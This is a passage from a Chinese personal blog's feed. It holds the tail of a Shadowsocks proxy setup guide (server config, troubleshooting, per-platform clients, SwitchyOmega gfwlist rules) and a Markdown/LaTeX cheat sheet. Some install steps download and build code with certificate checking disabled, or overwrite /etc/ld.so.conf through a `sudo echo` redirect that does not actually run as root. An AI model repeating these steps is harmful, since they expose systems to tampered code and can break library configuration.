&lt;h4 id=&quot;orgfb11996&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;2.1.3&lt;/span&gt; 问题解决&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-2-1-3&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;&lt;p&gt;
ShadowSocks start error: undefined symbol EVP_CIPHER_CTX_cleanup
[原因分析]
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
openssl 1.1.0 &quot;EVP_CIPHER_CTX_cleanup&quot; is old.
&lt;/pre&gt;

&lt;p&gt;
[解决办法]
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ vim /usr/local/lib/python3.5/dist-packages/shadowsocks/crypto/openssl.py
&lt;/pre&gt;

&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-python&quot; id=&quot;org8170318&quot;&gt;VIM Command&amp;#65306;
:%s/cleanup/reset/
:x
&lt;/pre&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
not support &quot;chacha20&quot;
[解决办法]
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ apt install m2crypto gcc -y
$ wget -N --no-check-certificate https://download.libsodium.org/libsodium/releases/libsodium-1.0.8.tar.gz
$ tar zxvf libsodium-1.0.8.tar.gz
$ cd libsodium-1.0.8
$ sudo ./configure
$ sudo make &amp;amp;&amp;amp; make install
$ sudo echo &quot;include ld.so.conf.d/*.conf&quot; &amp;gt; /etc/ld.so.conf
$ sudo echo &quot;/lib&quot; &amp;gt;&amp;gt; /etc/ld.so.conf
$ sudo echo &quot;/usr/lib64&quot; &amp;gt;&amp;gt; /etc/ld.so.conf
$ sudo echo &quot;/usr/local/lib&quot; &amp;gt;&amp;gt; /etc/ld.so.conf
$ sudo ldconfig
&lt;/pre&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orga1498ee&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orga1498ee&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;2.2&lt;/span&gt; Windows&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-2-2&quot;&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org69002ed&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org69002ed&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;2.2.1&lt;/span&gt; 下载&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-2-2-1&quot;&gt;
&lt;p&gt;
发送邮件至 zrg1390556487@gmail.com，索取 Windows Shadowsocks 客户端。
&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org43dc3fe&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org43dc3fe&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;2.2.2&lt;/span&gt; 配置&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-2-2-2&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;解压
&lt;img src=&quot;http://localhost:4000/assets/images/shadowsocks-20170123111438.png&quot; alt=&quot;shadowsocks-20170123111438.png&quot; /&gt;&lt;/li&gt;
&lt;li&gt;运行
&lt;img src=&quot;http://localhost:4000/assets/images/shadowsocks-20170123111902.png&quot; alt=&quot;shadowsocks-20170123111902.png&quot; /&gt;&lt;/li&gt;
&lt;li&gt;配置
&lt;img src=&quot;http://localhost:4000/assets/images/shadowsocks-20170123111953.png&quot; alt=&quot;shadowsocks-20170123111953.png&quot; /&gt;&lt;/li&gt;
&lt;li&gt;设置代理
&lt;img src=&quot;http://localhost:4000/assets/images/shadowsocks-20170123112126.png&quot; alt=&quot;shadowsocks-20170123112126.png&quot; /&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgaaad34a&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orgaaad34a&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;2.3&lt;/span&gt; Android&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-2-3&quot;&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org11292db&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org11292db&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;2.3.1&lt;/span&gt; 下载&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-2-3-1&quot;&gt;
&lt;p&gt;
发送邮件至 zrg1390556487@gmail.com，索取 Android Shadowsocks 客户端。
&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgca18096&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;orgca18096&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;2.3.2&lt;/span&gt; 配置&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-2-3-2&quot;&gt;

&lt;div class=&quot;figure&quot;&gt;
&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/shadowsocks-20170123141118.png&quot; alt=&quot;shadowsocks-20170123141118.png&quot; /&gt;
&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org0c77f22&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org0c77f22&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;2.4&lt;/span&gt; IOS&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-2-4&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;打开 Apple 应用市场, 搜索 &quot;shadowrocket&quot;。我记得不错的话，标价应该是：￥12&lt;/li&gt;
&lt;li&gt;配置
&lt;img src=&quot;http://localhost:4000/assets/images/ios-shadowrocket-01.jpeg&quot; alt=&quot;ios-shadowrocket-01.jpeg&quot; /&gt;
&lt;img src=&quot;http://localhost:4000/assets/images/ios-shadowrocket-02.jpeg&quot; alt=&quot;ios-shadowrocket-02.jpeg&quot; /&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org2d93777&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org2d93777&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;2.5&lt;/span&gt; Mac OS X&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-2-5&quot;&gt;
&lt;p&gt;
&lt;a href=&quot;https://github.com/shadowsocks/ShadowsocksX-NG&quot;&gt;https://github.com/shadowsocks/ShadowsocksX-NG&lt;/a&gt;
&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgbcd70d5&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;orgbcd70d5&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;3&lt;/span&gt; 浏览器插件：SwitchyOmega&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-3&quot;&gt;
&lt;p&gt;
该插件用于调节代理，方便快速切换代理上网模式。根据目前使用经验，Linux 必装，Windows 可选。
&lt;/p&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org2898ff8&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org2898ff8&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;3.1&lt;/span&gt; 下载&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-3-1&quot;&gt;
&lt;p&gt;
发送邮件至 zrg1390556487@gmail.com，索取 Mac OS X Shadowsocks 客户端。
&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org81c1aa7&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org81c1aa7&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;3.2&lt;/span&gt; 配置&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-3-2&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;设置代理
&lt;img src=&quot;http://localhost:4000/assets/images/switchyomega-01.png&quot; alt=&quot;switchyomega-01.png&quot; /&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
设定规则
&lt;img src=&quot;http://localhost:4000/assets/images/switchyomega-02.png&quot; alt=&quot;switchyomega-02.png&quot; /&gt;
&lt;b&gt;可选规则&lt;/b&gt;
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
rule:http://autoproxy-gfwlist.googlecode.com/svn/trunk/gfwlist.txt
&lt;/pre&gt;

&lt;p&gt;
or
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
https://raw.githubusercontent.com/gfwlist/gfwlist/master/gfwlist.txt
&lt;/pre&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgdd59930&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;orgdd59930&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;4&lt;/span&gt; 参考资料&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-4&quot;&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;&lt;a href=&quot;https://zh.wikipedia.org/zh-hans/Shadowsocks&quot;&gt;https://zh.wikipedia.org/zh-hans/Shadowsocks&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://shadowsocks.com&quot;&gt;https://shadowsocks.com&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://shadowsocks.org/&quot;&gt;http://shadowsocks.org/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://morning.work/page/2015-12/install-shadowsocks-on-centos-7.html&quot;&gt;在 CentOS 7 下安装配置 shadowsocks&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.linuxbabe.com/desktop-linux/how-to-install-and-use-shadowsocks-command-line-client&quot;&gt;Install And Use Shadowsocks Command Line Client on Linux&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://doub.io/ss-jc10/&quot;&gt;ShadowsocksR 客户端 小白使用教程&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://kionf.com/2016/12/15/errornote-ss/&quot;&gt;ShadowSocks启动报错undefined symbol EVP_CIPHER_CTX_cleanup&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/FelisCatus/SwitchyOmega/wiki/GFWList&quot;&gt;SwitchyOmega&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://doub.io/ss-jc25/&quot;&gt;IOS系统推荐几款支持Shadowsocks的代理软件&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.jeyzhang.com/how-to-install-and-setup-shadowsocks-client-in-different-os.html&quot;&gt;各种系统下Shadowsocks客户端的安装与配置&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.jianshu.com/p/41378f4e14bc&quot;&gt;linux 配置shadowsocks代理全局代理&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://blog.csdn.net/guizaijianchic/article/details/78422811&quot;&gt;linux ubuntu下使用ss设置全局代理,命令行也走代理&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;/div&gt;</content><author><name>zrg</name></author><category term="Shadowsocks" /><category term="SwitchyOmega" /><summary type="html">本文内容仅作交流学习和查阅技术资料之用，请勿用于商业用途！如造成任何后果，本文作者概不负责。谢谢您的关注！ 如果您有任何问题或建议，可以发送邮件到 zrg1390556487@gmail.com 1 服务端 1.1 服务部署第一步 首先，购买一台境外云服务器 搬瓦工 DigitalOcean AWS Vultr 1.2 安装和配置 Shadowsocks 安装 pip // CentOS # yum install python-pip 或者: # curl &quot;https://bootstrap.pypa.io/get-pip.py&quot; -o &quot;get-pip.py&quot; # python get-pip.py 安装及配置 shadowsocks // 使用 pip 安装 shadowsocks # pip install shadowsocks // 也可以选择自动安装脚本 install-shadowsocks.sh // 配置 shadowsocks # vim /etc/shadowsocks.json { &quot;server&quot;: &quot;123.123.123.123&quot;, &quot;server_port&quot;: 8388, &quot;local_address&quot;:&quot;127.0.0.1&quot;, &quot;local_port&quot;:1080, &quot;port_password&quot;:{ &quot;9001&quot;:&quot;password9001&quot;, &quot;9002&quot;:&quot;password9002&quot;, &quot;9003&quot;:&quot;password9003&quot; }, &quot;password&quot;: &quot;password&quot;, &quot;method&quot;: &quot;aes-256-cfb&quot;, &quot;timeout&quot;:600 } 解释: - &quot;server&quot;: &quot;123.123.123.123&quot; :: 服务器 IP 地址 - &quot;server_port&quot;: 8388 :: 服务器端口号 - &quot;local_address&quot;:&quot;127.0.0.1&quot; :: 本地回环地址 - &quot;local_port&quot;:1080, :: 本地端口号 - &quot;port_password&quot; :: 映射端口和密码 - &quot;password&quot;: &quot;password&quot; :: 密码 - &quot;method&quot;: &quot;aes-256-cfb&quot; :: 加密方式，详细可参考 [[http://ucdok.com/project/generate_password.html][password tool]] - &quot;timeout&quot;:600 :: 超时时间 配置自启动脚本 # vim /etc/systemd/system/shadowsocks.service [Unit] Description=Shadowsocks [Service] TimeoutStartSec=0 ExecStart=/usr/bin/ssserver -c /etc/shadowsocks.json [Install] WantedBy=multi-user.target 设置 shadowsocks 自启动 # systemctl enable shadowsocks # systemctl start shadowsocks # systemctl status shadowsocks -l 1.3 使用 Docker 安装 Shadowsocks 安装 docker # yum install docker # systemctl enable docker # systemctl start docker 部署 Shadowsocks # docker run -dt --name ss -p 6443:6443 mritd/shadowsocks -s &quot;-s 0.0.0.0 -p 6443 -m aes-256-cfb -k test123 --fast-open&quot; 2 客户端 目前支持以下客户端进行连接： Linux Windows Mac OS X Android IOS 2.1 Linux 2.1.1 安装、配置和使用 Linux Shadowsocks 客户端 Linux 系列 Debian/Ubuntu: $ sudo apt-get install python-pip $ sudo pip install shadowsocks Fedora/Centos: $ sudo yum install python-setuptools or $ sudo dnf install python-setuptools $ sudo easy_install pip $ sudo pip install shadowsocks OpenSUSE: $ sudo zypper install python-pip $ sudo pip install shadowsocks Archlinux: $ sudo pacman -S python-pip sudo pip install shadowsocks sslocal 是客户端软件，ssserver 是服务端软件，常见于 Linux 发行版，如 Ubuntu。sslocal 在 usr/local/bin 目录下，也有其他发行版在 /usr/bin 目录下，可以使用 whereis 命令找到它的位置。 $ whereis sslocal sslocal: /usr/local/bin/sslocal /etc/shadowsocks.json { &quot;server&quot;:&quot;server-ip&quot;, &quot;server_port&quot;:8000, &quot;local_address&quot;: &quot;127.0.0.1&quot;, &quot;local_port&quot;:1080, &quot;password&quot;:&quot;your-password&quot;, &quot;timeout&quot;:600, &quot;method&quot;:&quot;aes-256-cfb&quot; } // 启动 $ sudo sslocal -c /etc/shadowsocks.json // 后台运行 $ sudo sslocal -c /etc/shadowsocks.json -d start /etc/rc.local $ sudo vim /etc/rc.local sudo sslocal -c /etc/shadowsocks.json -d start // 检查是否正常工作 # sudo systemctl status rc-local.service 2.1.2 开启全局代理 安装及配置 polipo $ sudo apt install polipo $ sudo vim /etc/polipo/config logSyslog = true logFile = /var/log/polipo/polipo.log proxyAddress = &quot;0.0.0.0&quot; socksParentProxy = &quot;127.0.0.1:1080&quot; socksProxyType = socks5 chunkHighMark = 50331648 objectHighMark = 16384 serverMaxSlots = 64 serverSlots = 16 serverSlots1 = 32 重启 polipo $ sudo systemctl restart polipo 设置全局变量 http_proxy and https_proxy $ export http_proxy=&quot;http://127.0.0.1:8123/&quot; $ export https_proxy=&quot;https://127.0.0.1:8123/&quot; 测试 $ curl www.google.com 2.1.3 问题解决 ShadowSocks start error: undefined symbol EVP_CIPHER_CTX_cleanup [原因分析] openssl 1.1.0 &quot;EVP_CIPHER_CTX_cleanup&quot; is old. [解决办法] $ vim /usr/local/lib/python3.5/dist-packages/shadowsocks/crypto/openssl.py VIM Command&amp;#65306; :%s/cleanup/reset/ :x not support &quot;chacha20&quot; [解决办法] $ apt install m2crypto gcc -y $ wget -N --no-check-certificate https://download.libsodium.org/libsodium/releases/libsodium-1.0.8.tar.gz $ tar zxvf libsodium-1.0.8.tar.gz $ cd libsodium-1.0.8 $ sudo ./configure $ sudo make &amp;amp;&amp;amp; make install $ sudo echo &quot;include ld.so.conf.d/*.conf&quot; &amp;gt; /etc/ld.so.conf $ sudo echo &quot;/lib&quot; &amp;gt;&amp;gt; /etc/ld.so.conf $ sudo echo &quot;/usr/lib64&quot; &amp;gt;&amp;gt; /etc/ld.so.conf $ sudo echo &quot;/usr/local/lib&quot; &amp;gt;&amp;gt; /etc/ld.so.conf $ sudo ldconfig 2.2 Windows 2.2.1 下载 发送邮件至 zrg1390556487@gmail.com，索取 Windows Shadowsocks 客户端。 2.2.2 配置 解压 运行 配置 设置代理 2.3 Android 2.3.1 下载 发送邮件至 zrg1390556487@gmail.com，索取 Android Shadowsocks 客户端。 2.3.2 配置 2.4 IOS 打开 Apple 应用市场, 搜索 &quot;shadowrocket&quot;。我记得不错的话，标价应该是：￥12 配置 2.5 Mac OS X https://github.com/shadowsocks/ShadowsocksX-NG 3 浏览器插件：SwitchyOmega 该插件用于调节代理，方便快速切换代理上网模式。根据目前使用经验，Linux 必装，Windows 可选。 3.1 下载 发送邮件至 zrg1390556487@gmail.com，索取 Mac OS X Shadowsocks 客户端。 3.2 配置 设置代理 设定规则 可选规则 rule:http://autoproxy-gfwlist.googlecode.com/svn/trunk/gfwlist.txt or https://raw.githubusercontent.com/gfwlist/gfwlist/master/gfwlist.txt 4 参考资料 https://zh.wikipedia.org/zh-hans/Shadowsocks https://shadowsocks.com http://shadowsocks.org/ 在 CentOS 7 下安装配置 shadowsocks Install And Use Shadowsocks Command Line Client on Linux ShadowsocksR 客户端 小白使用教程 ShadowSocks启动报错undefined symbol EVP_CIPHER_CTX_cleanup SwitchyOmega IOS系统推荐几款支持Shadowsocks的代理软件 各种系统下Shadowsocks客户端的安装与配置 linux 配置shadowsocks代理全局代理 linux ubuntu下使用ss设置全局代理,命令行也走代理</summary></entry><entry><title type="html">Learning Markdown</title><link href="http://localhost:4000/software/2019/06/05/markdown/" rel="alternate" type="text/html" title="Learning Markdown" /><published>2019-06-05T00:00:00+08:00</published><updated>2019-06-05T00:00:00+08:00</updated><id>http://localhost:4000/software/2019/06/05/markdown</id><content type="html" xml:base="http://localhost:4000/software/2019/06/05/markdown/">&lt;h2 id=&quot;标题&quot;&gt;标题&lt;/h2&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#,一级标题 
##,二级标题
###,三级标题 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h2 id=&quot;列表&quot;&gt;列表&lt;/h2&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. 有序列表 
2. 有序列表 
3. 无序列表
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;引用&quot;&gt;引用&lt;/h2&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt; 有的人活着，他已经死了；有的人死了，他还活着
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;blockquote&gt;
  &lt;p&gt;有的人活着，他已经死了；有的人死了，他还活着&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;图片&quot;&gt;图片&lt;/h2&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;![Google Logo](https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png&quot; alt=&quot;Google Logo&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;链接&quot;&gt;链接&lt;/h2&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[Google](https://www.google.com/)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;a href=&quot;https://www.google.com/&quot;&gt;Google&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;分割线&quot;&gt;分割线&lt;/h2&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;***
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;hr /&gt;

&lt;h2 id=&quot;粗体斜体&quot;&gt;粗体/斜体&lt;/h2&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;**作者**
*张三*
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;作者&lt;/strong&gt;
&lt;em&gt;张三&lt;/em&gt;&lt;/p&gt;

&lt;h2 id=&quot;代码&quot;&gt;代码&lt;/h2&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;```sh
#/bin/sh
echo &quot;hello world&quot;
```
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#/bin/sh&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;hello world&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;区块标识&quot;&gt;区块标识&lt;/h2&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;这是一个区块
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;数学公式&quot;&gt;数学公式&lt;/h2&gt;
&lt;h3 id=&quot;上标下标与组合&quot;&gt;上标、下标与组合&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;上标符号，符号：^&lt;/li&gt;
  &lt;li&gt;下标符号，符号：_&lt;/li&gt;
  &lt;li&gt;组合符号，符号：{}
\(x^4\)&lt;/li&gt;
&lt;/ul&gt;

\[x_1\]

\[{16}_{8}O{2+}_{2}\]

&lt;h3 id=&quot;汉字字体与格式&quot;&gt;汉字、字体与格式&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;汉字形式，符号：\mbox{}&lt;/li&gt;
  &lt;li&gt;字体控制，符号：\displaystyle&lt;/li&gt;
  &lt;li&gt;下划线符号，符号：\underline&lt;/li&gt;
  &lt;li&gt;标签，符号\tag{数字}&lt;/li&gt;
  &lt;li&gt;上大括号，符号：\overbrace{算式}&lt;/li&gt;
  &lt;li&gt;下大括号，符号：\underbrace{算式}&lt;/li&gt;
  &lt;li&gt;上位符号，符号：\stacrel{上位符号}{基位符号}
\(V_{\mbox{初始}}\)&lt;/li&gt;
&lt;/ul&gt;

\[\displaystyle \frac{x+y}{y+z}\]

\[\underline{x+y}\]

\[\tag{11}\]

\[\overbrace{a+b+c+d}^{2.0}\]

\[a+\underbrace{b+c}_{1.0}+d\]

\[\vec{x}\stackrel{\mathrm{def}}{=}{x_1,\dots,x_n}\]

&lt;h3 id=&quot;占位符&quot;&gt;占位符&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;两个quad空格，符号：\qquad&lt;/li&gt;
  &lt;li&gt;quad空格，符号：\quad&lt;/li&gt;
  &lt;li&gt;大空格，符号\&lt;/li&gt;
  &lt;li&gt;中空格，符号:&lt;/li&gt;
  &lt;li&gt;小空格，符号\,&lt;/li&gt;
  &lt;li&gt;没有空格，符号``&lt;/li&gt;
  &lt;li&gt;紧贴，符号!
\(x \qquad y\)&lt;/li&gt;
&lt;/ul&gt;

\[x \quad y\]

\[x \ y\]

\[x : y\]

\[x , y\]

\[xy\]

\[x ! y\]

&lt;h3 id=&quot;定界符与组合&quot;&gt;定界符与组合&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;括号，符号：（）\big(\big) \Big(\Big) \bigg(\bigg) \Bigg(\Bigg)&lt;/li&gt;
  &lt;li&gt;中括号，符号：[]&lt;/li&gt;
  &lt;li&gt;大括号，符号：{ }&lt;/li&gt;
  &lt;li&gt;自适应括号，符号：\left \right&lt;/li&gt;
  &lt;li&gt;组合公式，符号：{上位公式 \choose 下位公式}&lt;/li&gt;
  &lt;li&gt;组合公式，符号：{上位公式 \atop 下位公式}
\(（）\big(\big) \Big(\Big) \bigg(\bigg) \Bigg(\Bigg)\)&lt;/li&gt;
&lt;/ul&gt;

\[[x+y]\]

\[{x+y}\]

\[\left(x\right)$，$\left(x{yz}\right)\]

\[{n+1 \choose k}={n \choose k}+{n \choose k-1}\]

\[\sum_{k_0,k_1,\ldots&amp;gt;0 \atop k_0+k_1+\cdots=n}A_{k_0}A_{k_1}\cdots\]

&lt;h3 id=&quot;四则运算&quot;&gt;四则运算&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;加法运算，符号：+&lt;/li&gt;
  &lt;li&gt;减法运算，符号：-&lt;/li&gt;
  &lt;li&gt;加减运算，符号：\pm&lt;/li&gt;
  &lt;li&gt;减甲运算，符号：\mp&lt;/li&gt;
  &lt;li&gt;乘法运算，符号：\times&lt;/li&gt;
  &lt;li&gt;点乘运算，符号：\cdot&lt;/li&gt;
  &lt;li&gt;星乘运算，符号：\ast&lt;/li&gt;
  &lt;li&gt;除法运算，符号：\div&lt;/li&gt;
  &lt;li&gt;斜法运算，符号：/&lt;/li&gt;
  &lt;li&gt;分式表示，符号：\frac{分子}{分母}&lt;/li&gt;
  &lt;li&gt;分式表示，符号：{分子} \voer {分母}&lt;/li&gt;
  &lt;li&gt;
    &lt;table&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
          &lt;td&gt;绝对值表示，符号：&lt;/td&gt;
          &lt;td&gt; &lt;/td&gt;
        &lt;/tr&gt;
      &lt;/tbody&gt;
    &lt;/table&gt;
  &lt;/li&gt;
&lt;/ul&gt;

\[x+y=z\]

\[x-y=z\]

\[x \pm y=z\]

\[x \mp y=z\]

\[x \times y=z\]

\[x \cdot y=z\]

\[x \ast y=z\]

\[x \div y=z\]

\[x/y=z\]

\[\frac{x+y}{y+z}\]

\[{x+y} \over {y+z}\]

\[|x+y|\]

\[\overline{xyz}\]

&lt;h3 id=&quot;高级运算&quot;&gt;高级运算&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;平均数运算，符号：\overline{算式}&lt;/li&gt;
  &lt;li&gt;开二次方运算，符号：\sqrt&lt;/li&gt;
  &lt;li&gt;开方运算，符号：\sqrt[开方数]{被开方数}&lt;/li&gt;
  &lt;li&gt;对数运算，符号：\log&lt;/li&gt;
  &lt;li&gt;极限运算，符号：\lim&lt;/li&gt;
  &lt;li&gt;极限运算，符号：\displaystyle \lim&lt;/li&gt;
  &lt;li&gt;求和运算，符号：\sum&lt;/li&gt;
  &lt;li&gt;求和运算，符号：\displaystyle \sum&lt;/li&gt;
  &lt;li&gt;积分运算，符号：\int&lt;/li&gt;
  &lt;li&gt;积分运算，符号：\displaystyle \int&lt;/li&gt;
  &lt;li&gt;微分运算，符号：\partial&lt;/li&gt;
  &lt;li&gt;矩阵表示，符号：\begin{matrix} \end{matrix}
\(\overline{xyz}\)&lt;/li&gt;
&lt;/ul&gt;

\[\sqrt x\]

\[\sqrt[3]{x+y}\]

\[\log(x)\]

\[\lim^{x \to \infty}_{y \to 0}{\frac{x}{y}}\]

\[\displaystyle \lim^{x \to \infty}_{y \to 0}{\frac{x}{y}}\]

\[\sum^{x \to \infty}_{y \to 0}{\frac{x}{y}}\]

\[\displaystyle \sum^{x \to \infty}_{y \to 0}{\frac{x}{y}}\]

\[\int^{\infty}_{0}{xdx}\]

\[\displaystyle \int^{\infty}_{0}{xdx}\]

\[\frac{\partial x}{\partial y}\]

